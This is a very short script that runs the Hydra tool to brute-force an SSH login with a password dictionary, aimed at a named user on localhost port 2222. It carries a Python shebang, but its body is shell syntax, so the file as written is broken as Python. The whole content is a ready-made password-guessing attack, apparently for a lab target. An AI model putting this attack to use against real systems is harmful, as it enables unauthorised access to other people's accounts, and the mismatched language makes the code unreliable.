#!/usr/bin/env python3

# This script performs a dictionary attack using Hydra
# to brute force an SSH account.

# Define variables
TARGET_IP="127.0.0.1"
TARGET_PORT="2222"
USERNAME="sylvain"
PASSWORD_DICTIONARY="/path/to/password_dictionary.txt"

# Perform the dictionary attack using Hydra
hydra -l $USERNAME -P $PASSWORD_DICTIONARY ssh://$TARGET_IP:$TARGET_PORT
